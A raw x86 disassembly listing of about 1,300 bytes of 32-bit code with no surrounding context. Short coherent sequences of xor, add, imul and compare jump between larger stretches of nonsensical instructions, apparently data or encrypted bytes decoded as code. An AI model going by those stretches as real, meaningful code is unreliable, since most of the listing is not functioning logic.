  40b8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8db:	dec    edx
  40b8dc:	jns    0x40b8d2
  40b8de:	(bad)  
  40b8df:	aaa    
  40b8e0:	data16 add dh,BYTE PTR [esi-0x2d65d293]
  40b8e7:	mov    edx,0xa76baa18
  40b8ec:	inc    eax
  40b8ed:	push   0xffffffbe
  40b8ef:	cdq    
  40b8f0:	jne    0x40b929
  40b8f2:	and    al,0x79
  40b8f4:	loopne 0x40b8c2
  40b8f6:	pop    esp
  40b8f7:	cmp    dl,BYTE PTR [eax-0x74f95436]
  40b8fd:	jge    0x40b8fb
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x2f679905],cl
  40b949:	dec    ecx
  40b94a:	or     eax,0x70708360
  40b94f:	lahf   
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9d0
  40b954:	jo     0x40b9d1
  40b956:	fcomi  st,st(7)
  40b958:	bound  ebp,QWORD PTR [esi]
  40b95a:	xchg   esp,eax
  40b95b:	popf   
  40b95c:	cs push 0x3a2bc40
  40b962:	adc    ah,BYTE PTR [ebp-0x8]
  40b965:	fmul   DWORD PTR [eax]
  40b967:	lods   eax,DWORD PTR ds:[esi]
  40b968:	jmp    0x3dafbab9
  40b96d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b96e:	(bad)  
  40b96f:	mov    bh,0xfd
  40b971:	mov    ds:0xc41f6150,al
  40b976:	jae    0x40b945
  40b978:	rcl    DWORD PTR [eax+edi*1],0xff
  40b97c:	data16 out 0x15,al
  40b97f:	(bad)  
  40b980:	hlt    
  40b981:	ja     0x40b9ca
  40b983:	and    bl,BYTE PTR [edi+0xfc90c14]
  40b989:	and    DWORD PTR [edx+0x3f47f2b2],esi
  40b98f:	xor    cl,0x7e
  40b992:	add    edx,ebp
  40b994:	cdq    
  40b995:	fcom   st(4)
  40b997:	fdivr  QWORD PTR [eax-0x54b68bab]
  40b99d:	sbb    ch,al
  40b99f:	ret    0xfd96
  40b9a2:	sbb    al,0xe0
  40b9a4:	mov    edx,0x838e1bd6
  40b9a9:	cwde   
  40b9aa:	sbb    eax,0xd385a019
  40b9af:	iret   
  40b9b0:	adc    eax,0xee0f3f48
  40b9b5:	or     ecx,DWORD PTR [edx-0x60]
  40b9b8:	shl    ecx,0xe1
  40b9bb:	dec    eax
  40b9bc:	dec    edx
  40b9bd:	ins    DWORD PTR es:[edi],dx
  40b9be:	and    DWORD PTR [eax-0xb],ecx
  40b9c1:	ficomp DWORD PTR [esi-0x3]
  40b9c4:	aaa    
  40b9c5:	ins    BYTE PTR es:[edi],dx
  40b9c6:	aas    
  40b9c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9c8:	add    dl,BYTE PTR [edx-0x19]
  40b9cb:	repnz mov cl,0x16
  40b9ce:	push   ebx
  40b9cf:	sbb    esp,edi
  40b9d1:	adc    BYTE PTR [edi],bl
  40b9d3:	mov    al,0x2c
  40b9d5:	jns    0x40ba4e
  40b9d7:	pop    esi
  40b9d8:	mov    ah,0xa8
  40b9da:	mov    bl,0xa6
  40b9dc:	jb     0x40b9f9
  40b9de:	(bad)  
  40b9df:	dec    esp
  40b9e0:	outs   dx,BYTE PTR ds:[esi]
  40b9e1:	add    BYTE PTR [esi+0x66],al
  40b9e4:	mov    edi,DWORD PTR [ebp+edx*8+0x1a]
  40b9e8:	test   BYTE PTR [ecx-0x2d],bh
  40b9eb:	(bad)  
  40b9ee:	jno    0x40ba4e
  40b9f0:	and    al,BYTE PTR [ebp+0x57]
  40b9f3:	in     al,dx
  40b9f4:	pusha  
  40b9f5:	push   es
  40b9f6:	ds sub BYTE PTR gs:[ebx],dl
  40b9fa:	jae    0x40b9b4
  40b9fc:	fisubr DWORD PTR [eax+0x364c6599]
  40ba02:	pop    esp
  40ba03:	test   BYTE PTR [ebx+0x73],al
  40ba06:	jnp    0x40ba3a
  40ba08:	mov    ebx,0x8eb70dd2
  40ba0d:	push   es
  40ba0e:	aaa    
  40ba0f:	repz add eax,0x302f9023
  40ba15:	xchg   esi,eax
  40ba16:	mov    dl,0x49
  40ba18:	icebp  
  40ba19:	push   esp
  40ba1a:	call   0x1d67:0x1dba4736
  40ba21:	cmp    BYTE PTR [ebx],cl
  40ba23:	push   esi
  40ba24:	add    bl,dl
  40ba26:	push   ds
  40ba27:	sub    eax,0xdc08bbf6
  40ba2c:	cmp    ch,BYTE PTR [edx+0x60]
  40ba2f:	hlt    
  40ba30:	bound  edi,QWORD PTR [eax]
  40ba32:	mov    cl,BYTE PTR ds:0x1de063c8
  40ba38:	push   edx
  40ba39:	xor    al,0xe2
  40ba3b:	fs call 0x90bb:0x163ad27f
  40ba43:	sub    al,0xe0
  40ba45:	shl    DWORD PTR [eax-0x4deb8ebb],0xfa
  40ba4c:	or     DWORD PTR [ebx-0x8],ebp
  40ba4f:	inc    esp
  40ba50:	xor    BYTE PTR [esi],ch
  40ba52:	xchg   edx,eax
  40ba53:	pop    esi
  40ba54:	inc    esp
  40ba55:	jbe    0x40ba9c
  40ba57:	or     DWORD PTR ds:0x87cda4ac,eax
  40ba5d:	xor    ecx,DWORD PTR [edx+eax*8]
  40ba60:	xchg   DWORD PTR ds:0x195a3f53,ecx
  40ba66:	sbb    eax,0x25489e65
  40ba6b:	push   cs
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	or     BYTE PTR [ebx+0x5f4b5e94],dh
  40ba73:	ds push 0xbfd11e8c
  40ba79:	aam    0x4d
  40ba7b:	leave  
  40ba7c:	sbb    ebp,0xd9d0e3a5
  40ba82:	cmp    DWORD PTR ss:[ebx],ebp
  40ba85:	adc    eax,0x108d388c
  40ba8a:	add    DWORD PTR [edx],esp
  40ba8c:	cdq    
  40ba8d:	jecxz  0x40bae9
  40ba8f:	push   cs
  40ba90:	add    dh,BYTE PTR [edi-0x3a]
  40ba93:	hlt    
  40ba94:	fldenv [eax+0x33eb6712]
  40ba9a:	inc    ebx
  40ba9b:	pop    edi
  40ba9c:	cld    
  40ba9d:	cld    
  40ba9e:	in     eax,0xf8
  40baa0:	and    DWORD PTR [ebx-0x67],ebx
  40baa3:	daa    
  40baa4:	mov    edi,0xc3cc9215
  40baa9:	adc    BYTE PTR [eax],0xd
  40baac:	lods   ax,WORD PTR ds:[esi]
  40baae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baaf:	xchg   esi,eax
  40bab0:	shl    BYTE PTR [ebx],1
  40bab2:	stos   DWORD PTR es:[edi],eax
  40bab3:	xchg   ecx,eax
  40bab4:	adc    dh,BYTE PTR [esi-0x1]
  40bab7:	pushf  
  40bab8:	cwde   
  40bab9:	lods   eax,DWORD PTR ds:[esi]
  40baba:	stos   BYTE PTR es:[edi],al
  40babb:	inc    esi
  40babc:	js     0x40ba69
  40babe:	pop    edx
  40babf:	cs inc ecx
  40bac1:	addr16 mov ah,0xe8
  40bac4:	stc    
  40bac5:	push   ecx
  40bac6:	fwait
  40bac7:	in     al,0x53
  40bac9:	cdq    
  40baca:	pop    ebx
  40bacb:	addr16 out 0x67,al
  40bace:	cli    
  40bacf:	repnz call 0xfe5e:0x21596a53
  40bad7:	scas   al,BYTE PTR es:[edi]
  40bad8:	inc    BYTE PTR [edx]
  40bada:	add    BYTE PTR [ebx+0x5d],bl
  40badd:	jno    0x40ba72
  40badf:	jge    0x40bab1
  40bae1:	jp     0x40bb0e
  40bae3:	dec    esp
  40bae4:	lahf   
  40bae5:	sbb    BYTE PTR [ebp-0x1ba4b691],ch
  40baeb:	jle    0x40ba93
  40baed:	inc    eax
  40baee:	pop    ss
  40baef:	scas   eax,DWORD PTR es:[edi]
  40baf0:	sbb    al,BYTE PTR [edx]
  40baf2:	and    eax,0xd750d4de
  40baf7:	jnp    0x40bb14
  40baf9:	sar    DWORD PTR [esi-0x2],0xf4
  40bafd:	mov    esp,0x937513ce
  40bb02:	sbb    eax,0xfa558b38
  40bb07:	pop    es
  40bb08:	mov    esp,0x25da43f8
  40bb0d:	fs dec esi
  40bb0f:	rcl    DWORD PTR [ecx-0x2],cl
  40bb12:	or     BYTE PTR [eax+0x5e],0x9f
  40bb16:	pop    es
  40bb17:	lock fisubr DWORD PTR [edi+edx*8]
  40bb1b:	push   esi
  40bb1c:	outs   dx,BYTE PTR ds:[esi]
  40bb1d:	cs int3 
  40bb1f:	push   ds
  40bb20:	lahf   
  40bb21:	xchg   DWORD PTR [ecx],ecx
  40bb23:	iret   
  40bb24:	loopne 0x40bb66
  40bb26:	jecxz  0x40bb41
  40bb28:	adc    BYTE PTR [ecx-0x2d],dh
  40bb2b:	imul   esi,DWORD PTR [ecx],0x77c1e3b5
  40bb31:	cwde   
  40bb32:	popa   
  40bb33:	sub    edi,DWORD PTR [eax]
  40bb35:	push   edx
  40bb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb37:	jo     0x40bacb
  40bb39:	xor    DWORD PTR [esi-0x4dc04034],esi
  40bb3f:	mov    eax,ds:0xb46e4903
  40bb44:	lds    ebp,FWORD PTR [ebx+eax*1-0x5995a57e]
  40bb4b:	and    DWORD PTR [eax+0x13],ecx
  40bb4e:	push   edx
  40bb4f:	(bad)  
  40bb50:	or     BYTE PTR ds:0xc6547024,bh
  40bb56:	ss cli 
  40bb58:	bsr    edi,edx
  40bb5b:	ins    DWORD PTR es:[edi],dx
  40bb5c:	(bad)  
  40bb5d:	je     0x40bb35
  40bb5f:	jge    0x40bb70
  40bb61:	pop    DWORD PTR [ebp-0x2008ff80]
  40bb67:	jno    0x40bb5a
  40bb69:	pop    ebx
  40bb6a:	inc    ecx
  40bb6b:	fwait
  40bb6c:	scas   al,BYTE PTR es:[edi]
  40bb6d:	cmp    dh,dl
  40bb6f:	pop    ss
  40bb70:	pusha  
  40bb71:	inc    esp
  40bb72:	fstp   TBYTE PTR [eax-0xf12e237]
  40bb78:	push   0x3d
  40bb7a:	cld    
  40bb7b:	mov    esi,0xb0e221c9
  40bb80:	enter  0x4252,0xc3
  40bb84:	jnp    0x40bb1d
  40bb86:	(bad)  
  40bb87:	int    0x43
  40bb89:	inc    eax
  40bb8a:	and    ebp,edi
  40bb8c:	sbb    ebp,ebx
  40bb8e:	add    al,0x75
  40bb90:	cmp    BYTE PTR [edx+0x29],al
  40bb93:	mov    ds:0x9f9d0c13,eax
  40bb98:	mov    esp,0xcb5775a4
  40bb9d:	outs   dx,BYTE PTR ds:[esi]
  40bb9e:	rcl    dl,cl
  40bba0:	dec    eax
  40bba1:	sub    ecx,eax
  40bba3:	adc    eax,0x364f2fd5
  40bba8:	rcl    BYTE PTR [ebx],cl
  40bbaa:	popa   
  40bbab:	pop    edx
  40bbac:	(bad)  
  40bbae:	xor    edi,DWORD PTR [edi-0xb3ee9c9]
  40bbb4:	push   es
  40bbb5:	jno    0x40bc2d
  40bbb7:	cmp    BYTE PTR [ebp-0x2fa02249],dh
  40bbbd:	iret   
  40bbbe:	mov    al,BYTE PTR [ebx+0x40024d77]
  40bbc4:	sbb    ah,BYTE PTR [ebx-0x47]
  40bbc7:	imul   edx,ecx,0x78
  40bbca:	fwait
  40bbcb:	mov    al,ds:0xa911e388
  40bbd0:	jbe    0x40bb5d
  40bbd2:	enter  0x8a05,0xc8
  40bbd6:	cmp    ebp,edx
  40bbd8:	(bad)  
  40bbd9:	xchg   ebx,eax
  40bbda:	sbb    al,0x36
  40bbdc:	outs   dx,BYTE PTR ds:[esi]
  40bbdd:	pop    edx
  40bbde:	jecxz  0x40bc5c
  40bbe0:	pop    esp
  40bbe1:	or     DWORD PTR [esi-0x4e907a34],edi
  40bbe7:	je     0x40bb73
  40bbe9:	dec    eax
  40bbea:	mov    DWORD PTR [edx],ecx
  40bbec:	xchg   edi,eax
  40bbed:	adc    BYTE PTR [esi],bl
  40bbef:	lock out dx,al
  40bbf1:	or     DWORD PTR [esi+0x43],0xed8a6e4c
  40bbf8:	dec    esp
  40bbf9:	or     BYTE PTR [ebp+0x34],cl
  40bbfc:	xor    cl,bh
  40bbfe:	or     dl,BYTE PTR [ebp-0x37db27ad]
  40bc04:	add    eax,0x9cca7932
  40bc09:	mov    al,0x8e
  40bc0b:	xchg   esp,eax
  40bc0c:	aaa    
  40bc0d:	sbb    BYTE PTR [eax-0x23],bl
  40bc10:	lods   eax,DWORD PTR ds:[esi]
  40bc11:	ins    BYTE PTR es:[edi],dx
  40bc12:	jno    0x40bbc5
  40bc14:	or     ecx,edi
  40bc16:	mov    eax,ds:0x8d05b620
  40bc1b:	jmp    0x2d20:0xbfb45382
  40bc22:	mov    bl,0xb
  40bc24:	enter  0x4b75,0x69
  40bc28:	cmp    al,0x26
  40bc2a:	mov    BYTE PTR fs:[edi+ecx*4],dl
  40bc2e:	je     0x40bc23
  40bc30:	mov    ebp,DWORD PTR es:[eax+0x66]
  40bc34:	cmp    cl,BYTE PTR [ebp-0x14]
  40bc37:	xor    BYTE PTR ds:0x122e236d,ah
  40bc3d:	cmp    ah,BYTE PTR [esi]
  40bc3f:	fcmove st,st(2)
  40bc41:	retf   0xa717
  40bc44:	sub    al,0xf2
  40bc46:	mov    ds:0x331858de,eax
  40bc4b:	cmp    eax,0xdd6033e9
  40bc50:	cli    
  40bc51:	adc    BYTE PTR [edx+ebx*1+0x4d027cd0],0xc0
  40bc59:	(bad)  
  40bc5a:	and    eax,0x2a7b1d1c
  40bc5f:	out    dx,eax
  40bc60:	sub    bh,dl
  40bc62:	sti    
  40bc63:	in     eax,dx
  40bc64:	cmp    eax,0x71402a27
  40bc69:	jge    0x40bc55
  40bc6b:	fisttp DWORD PTR [ebx-0x5]
  40bc6e:	mov    ds:0xd7af2349,al
  40bc73:	test   eax,0x22bfd008
  40bc78:	xor    esp,edx
  40bc7a:	jnp    0x40bc1c
  40bc7c:	inc    esp
  40bc7d:	xor    esi,DWORD PTR [edx+0x1a35fbe6]
  40bc83:	loope  0x40bc4a
  40bc85:	adc    ch,dl
  40bc87:	(bad)  
  40bc88:	and    al,0xb5
  40bc8a:	mov    eax,ds:0x9298dfb8
  40bc8f:	inc    esp
  40bc90:	ret    0x2b9e
  40bc93:	or     edi,DWORD PTR ds:0xbffcbe3e
  40bc99:	lds    edi,FWORD PTR [eax-0x2c5a846]
  40bc9f:	mov    WORD PTR [esi+ebx*1-0x6ab9865c],ds
  40bca6:	xor    eax,0xd412565f
  40bcab:	dec    esi
  40bcac:	mov    cl,0xb
  40bcae:	jl     0x40bd1e
  40bcb0:	dec    edi
  40bcb1:	mul    DWORD PTR [edx]
  40bcb3:	mov    ah,BYTE PTR [edi]
  40bcb5:	jge    0x40bc4b
  40bcb7:	aam    0xaf
  40bcb9:	adc    BYTE PTR [ecx],cl
  40bcbb:	loop   0x40bd2c
  40bcbd:	jp     0x40bca9
  40bcbf:	pop    ebp
  40bcc0:	inc    ebx
  40bcc1:	jno    0x40bd14
  40bcc3:	hlt    
  40bcc4:	xor    al,0xa3
  40bcc6:	xchg   esp,eax
  40bcc7:	mov    eax,ds:0xfee24e64
  40bccc:	dec    edi
  40bccd:	xchg   BYTE PTR [esi+ecx*4+0x5a],bh
  40bcd1:	pop    edx
  40bcd2:	xor    ebp,ebx
  40bcd4:	xchg   edx,eax
  40bcd5:	std    
  40bcd6:	rol    BYTE PTR [edi],1
  40bcd8:	sbb    eax,0x152bcefc
  40bcdd:	cwde   
  40bcde:	xor    cl,ch
  40bce0:	scas   al,BYTE PTR es:[edi]
  40bce1:	inc    ecx
  40bce2:	call   0x295f26b7
  40bce7:	ins    DWORD PTR es:[edi],dx
  40bce8:	cdq    
  40bce9:	retf   0x18fb
  40bcec:	adc    eax,0x6cb445c4
  40bcf1:	sub    eax,0x5d8b8111
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ch,ch
  40bd3f:	das    
  40bd40:	call   0x9f70:0x708f8f20
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bdb4
  40bd4b:	rcr    DWORD PTR [edi+0x41],cl
  40bd4e:	adc    bh,ch
  40bd50:	shl    DWORD PTR [eax+0x50],cl
  40bd53:	xchg   esp,eax
  40bd54:	ins    BYTE PTR es:[edi],dx
  40bd55:	xchg   edi,eax
  40bd56:	fsincos 
  40bd58:	fwait
  40bd59:	push   edx
  40bd5a:	pop    eax
  40bd5b:	daa    
  40bd5c:	adc    ecx,0x40
  40bd5f:	add    BYTE PTR [edi+0x21],bl
  40bd62:	outs   dx,BYTE PTR ds:[esi]
  40bd63:	sbb    DWORD PTR [esi-0x5a],edx
  40bd66:	leave  
  40bd67:	int    0x4f
  40bd69:	fild   DWORD PTR ds:0xfaa95861
  40bd6f:	sbb    al,0x41
  40bd71:	cmc    
  40bd72:	sbb    BYTE PTR [esi+0x7e],al
  40bd75:	mov    cl,0x42
  40bd77:	mov    ebp,0xdad7ffcc
  40bd7c:	ficom  DWORD PTR [ebx]
  40bd7e:	jge    0x40bdf3
  40bd80:	jb     0x40bd7c
  40bd82:	int3   
  40bd83:	test   DWORD PTR [edi+eax*8],edi
  40bd86:	push   ss
  40bd87:	loop   0x40bdfe
  40bd89:	arpl   cx,bx
  40bd8b:	jecxz  0x40bdce
  40bd8d:	jb     0x40bd91
  40bd8f:	ins    DWORD PTR es:[edi],dx
  40bd90:	jmp    0x40bd4b
  40bd92:	pop    esi
  40bd93:	xor    al,0xd6
  40bd95:	mov    dl,0x7c
  40bd97:	adc    edx,DWORD PTR [ebx-0x1d783326]
  40bd9d:	aam    0xc
  40bd9f:	sti    
  40bda0:	and    ebx,DWORD PTR [edx]
  40bda2:	js     0x40bdbe
  40bda4:	test   esi,ebx
  40bda6:	shr    al,cl
  40bda8:	xor    dl,BYTE PTR [ebx+0x45]
  40bdab:	and    bh,al
  40bdad:	push   edx
  40bdae:	fs retf 0x37f0
  40bdb2:	sub    al,0xd7
  40bdb4:	dec    ebp
  40bdb5:	or     BYTE PTR [ebx],bh
  40bdb7:	xchg   edi,eax
  40bdb8:	adc    BYTE PTR [eax],bl
  40bdba:	nop
  40bdbb:	test   al,0xfd
  40bdbd:	pushf  
  40bdbe:	test   cl,dh
  40bdc0:	cmp    ebx,DWORD PTR [esi+0x5fcf67a1]
  40bdc6:	retf   0xbe57
  40bdc9:	mov    esi,0xb063454
  40bdce:	aaa    
  40bdcf:	or     DWORD PTR [eax],ecx
  40bdd1:	(bad)  
  40bdd2:	cmc    
  40bdd3:	sbb    al,0xf1
  40bdd5:	sub    eax,0xb8588e24
  40bdda:	shr    BYTE PTR [ebx+ecx*1],0x7c
  40bdde:	dec    ebx
  40bddf:	mov    edi,0x8c8159d7
  40bde4:	xchg   ebp,eax
  40bde5:	dec    edi
  40bde6:	not    BYTE PTR [esi-0x6b]
  40bde9:	or     ebp,esi
  40bdeb:	adc    DWORD PTR [ebp+edx*4-0x7b8eda9e],ebp
  40bdf2:	in     eax,dx
  40bdf3:	and    al,0xba
  40bdf5:	pop    ebp
  40bdf6:	loopne 0x40bdec
  40bdf8:	bound  ecx,QWORD PTR [edi-0x455c42de]
  40bdfe:	data16 sub BYTE PTR [edx-0x3d1a923b],ah
  40be05:	and    al,0x7d
  40be07:	icebp  
  40be08:	clc    
  40be09:	or     ecx,ebx
  40be0b:	pop    ecx
  40be0c:	das    
  40be0d:	ds nop
  40be0f:	(bad)  
  40be10:	aad    0x37
  40be12:	dec    ebp
  40be13:	push   eax
  40be14:	loopne 0x40be5d
  40be16:	out    0x4c,eax
  40be18:	iret   
  40be19:	fbstp  TBYTE PTR [eax+0x7602e128]
  40be1f:	jecxz  0x40bdeb
  40be21:	jnp    0x40be09
  40be23:	mov    dx,0x6c99
  40be27:	mov    esp,0x1799666d
  40be2c:	mov    BYTE PTR [edx],bh
  40be2e:	inc    esi
  40be2f:	mov    ebp,0xb32566e3
  40be34:	std    
  40be35:	or     eax,0x6f2d7e55
  40be3a:	cmc    
  40be3b:	push   esi
  40be3c:	or     al,0x81
  40be3e:	mov    al,ds:0x47869772
  40be43:	daa    
  40be44:	inc    ecx
  40be45:	ss mov eax,0x724edd29
  40be4b:	xor    al,0x37
  40be4d:	and    al,BYTE PTR [esi+0x79]
  40be50:	add    eax,0x757da7b8
  40be55:	je     0x40be88
  40be57:	adc    eax,0xa819fad9
  40be5c:	fcomp  DWORD PTR [ebx]
  40be5e:	mov    al,ds:0x5b3e6165
  40be63:	ficom  WORD PTR [esi]
  40be65:	icebp  
  40be66:	ins    DWORD PTR es:[edi],dx
  40be67:	jmp    0x40be55
  40be69:	mov    dh,0x12
  40be6b:	cmp    edx,edx
  40be6d:	cmp    al,0x88
  40be70:	lahf   
  40be71:	jge    0x40be27
  40be73:	out    dx,al
  40be74:	push   0x562a0759
  40be79:	mov    ebp,?
  40be7b:	test   eax,0xb0460ec7
  40be81:	sbb    ecx,edi
  40be83:	daa    
  40be84:	ins    DWORD PTR es:[edi],dx
  40be85:	mov    eax,0x88c08d12
  40be8a:	adc    eax,0x42843ce5
  40be8f:	xchg   esp,eax
  40be90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be91:	xor    al,0xa0
  40be93:	inc    edx
  40be94:	fs dec ebp
  40be96:	in     eax,dx
  40be97:	icebp  
  40be98:	sbb    edi,DWORD PTR [ebx+0x43]
  40be9b:	mov    BYTE PTR [ebx-0x2fe6568b],bh
  40bea1:	pop    esp
  40bea2:	sub    al,0x5c
  40bea4:	mov    WORD PTR [ecx-0x25],ds
  40bea7:	xchg   esp,eax
  40bea8:	out    0x13,al
  40beaa:	mov    ebp,0x32b99994
  40beaf:	pop    ds
  40beb0:	sub    dl,BYTE PTR [eax+0x30]
  40beb3:	jns    0x40beda
  40beb5:	cmp    dh,BYTE PTR [ecx+0x2c77532a]
  40bebb:	shr    BYTE PTR [ebp+0x7],cl
  40bebe:	jmp    0x40bec4
  40bec0:	(bad)  
  40bec1:	pop    ecx
  40bec2:	icebp  
  40bec3:	sahf   
  40bec4:	cmc    
  40bec5:	test   DWORD PTR [ecx+0x5e],0xc93b2c7
  40becc:	pop    esp
  40becd:	jle    0x40be60
  40becf:	xor    al,ch
  40bed1:	mul    DWORD PTR [edx+0x71620c63]
  40bed7:	mov    dh,BYTE PTR [ecx+0x70c0263f]
  40bedd:	inc    ebp
  40bede:	loopne 0x40bef9
  40bee0:	inc    ebx
  40bee1:	mov    ebx,0x9e6b4682
  40bee6:	(bad)  
  40bee8:	in     al,0x35
  40beea:	xor    ch,BYTE PTR [edi-0x719f9db6]
  40bef0:	pop    edi
  40bef1:	lock pop edx
  40bef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef4:	(bad)  
  40bef5:	jae    0x40bee6
  40bef7:	aad    0xdf
  40bef9:	jmp    0x40bebc
  40befb:	(bad)  
  40befc:	mov    ecx,0xc9115ff2
  40bf01:	xchg   edx,eax
  40bf02:	test   al,0x29
  40bf04:	int3   
  40bf05:	mov    BYTE PTR [ebx],al
  40bf07:	mov    ah,bl
  40bf09:	jae    0x40bf3d
  40bf0b:	out    0x5f,al
  40bf0d:	lds    esi,FWORD PTR [ecx-0x2b]
  40bf10:	sub    bh,bl
  40bf12:	inc    ebp
  40bf13:	mov    edx,0xd92a825f
  40bf18:	push   eax
  40bf19:	fcom   DWORD PTR [ebx-0x1b231603]
  40bf1f:	jmp    0xf3a8:0xa30262b
  40bf26:	inc    ebx
  40bf27:	xchg   ebp,eax
  40bf28:	in     eax,dx
  40bf29:	add    eax,0x631c8fc
  40bf2e:	sbb    eax,0xf1a62df
  40bf33:	sub    DWORD PTR [edx+0x6b],0x2d
  40bf37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf38:	jmp    0x7887:0x204242e0
  40bf3f:	fbld   TBYTE PTR [ecx-0xb27d9de]
  40bf45:	retf   
  40bf46:	test   BYTE PTR [ebp-0x63],cl
  40bf49:	das    
  40bf4a:	mov    al,ds:0xbc16df65
  40bf4f:	sbb    al,0x5e
  40bf51:	jo     0x40bfcc
  40bf53:	inc    esp
  40bf54:	jo     0x40bf72
  40bf56:	push   0xffffffc6
  40bf58:	clc    
  40bf59:	mov    ds:0x7802d4c0,eax
  40bf5e:	and    edi,ebx
  40bf60:	jg     0x40bfe1
  40bf62:	sbb    al,0x50
  40bf64:	push   0xe60227fa
  40bf69:	mov    bl,ah
  40bf6b:	mov    al,0x35
  40bf6d:	push   ds
  40bf6e:	adc    DWORD PTR [ebx-0x23],0x63928706
  40bf75:	inc    esi
  40bf76:	pop    ds
  40bf77:	push   esi
  40bf78:	pop    eax
  40bf79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf7a:	cmp    al,0xe0
  40bf7c:	xchg   ebx,eax
  40bf7d:	mov    al,bh
  40bf7f:	pop    es
  40bf80:	addr16 mov al,0x68
  40bf83:	sub    eax,0x8e1e8fea
  40bf88:	jne    0x40bffd
  40bf8a:	stos   DWORD PTR es:[edi],eax
  40bf8b:	shr    DWORD PTR [esi-0x15a66ad7],cl
  40bf91:	rol    BYTE PTR [eax+ebx*1-0x24],cl
  40bf95:	gs sbb eax,0xd69ae4bd
  40bf9b:	sbb    eax,0xb4786de3
  40bfa0:	push   esp
  40bfa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfa2:	dec    esp
  40bfa3:	mov    edx,0x17fe0d7b
  40bfa8:	cmp    BYTE PTR [eax+0x378c7181],ch
  40bfae:	mov    ecx,DWORD PTR [eax]
  40bfb0:	push   ds
  40bfb1:	xchg   ecx,eax
  40bfb2:	push   eax
  40bfb3:	inc    esp
  40bfb4:	adc    bl,cl
  40bfb6:	in     al,0x80
  40bfb8:	loop   0x40c009
  40bfba:	cdq    
  40bfbb:	lods   eax,DWORD PTR ds:[esi]
  40bfbc:	jg     0x40bf77
  40bfbe:	stos   DWORD PTR es:[edi],eax
  40bfbf:	adc    DWORD PTR [edx-0x1c],eax
  40bfc2:	xchg   edi,eax
  40bfc3:	into   
  40bfc4:	or     eax,0xae2c7a94
  40bfc9:	mov    ebx,DWORD PTR [edx-0x73565105]
  40bfcf:	sub    al,0x6c
  40bfd1:	sbb    esp,DWORD PTR [ebp-0x78]
  40bfd4:	stos   BYTE PTR es:[edi],al
  40bfd5:	pusha  
  40bfd6:	repnz or cl,ah
  40bfd9:	stos   DWORD PTR es:[edi],eax
  40bfda:	mov    ch,0xf6
  40bfdc:	jle    0x40c02a
  40bfde:	lahf   
  40bfdf:	inc    ebx
  40bfe0:	out    dx,eax
  40bfe1:	ja     0x40c056
  40bfe3:	mov    esi,0x2c7ca4c6
  40bfe8:	div    BYTE PTR [eax+eiz*2]
  40bfeb:	aaa    
  40bfec:	xchg   edx,eax
  40bfed:	loop   0x40c051
  40bfef:	xor    al,BYTE PTR [eax+0x51]
  40bff2:	jmp    0xf5c2bd14
  40bff7:	pop    esp
  40bff8:	push   0xffffffab
  40bffa:	mov    ch,0x39
  40bffc:	jge    0x40bfe3
  40bffe:	sbb    BYTE PTR [eax+0x41],cl
  40c001:	pop    ebx
  40c002:	bound  eax,QWORD PTR [eax+0x6]
  40c005:	outs   dx,BYTE PTR ds:[esi]
  40c006:	mov    eax,ds:0xdcab3a2
  40c00b:	and    esi,ebp
  40c00d:	pushf  
  40c00e:	pop    esi
  40c00f:	xchg   BYTE PTR [edx-0x2f48a8fa],ah
  40c015:	adc    edi,ebx
  40c017:	mov    ebp,0x9c360626
  40c01c:	sbb    DWORD PTR [esi-0x2dc5b5a8],ebx
  40c022:	ins    BYTE PTR es:[edi],dx
  40c023:	ss ins BYTE PTR es:[edi],dx
  40c025:	sub    eax,DWORD PTR [edx]
  40c027:	cmp    eax,0x4f599c14
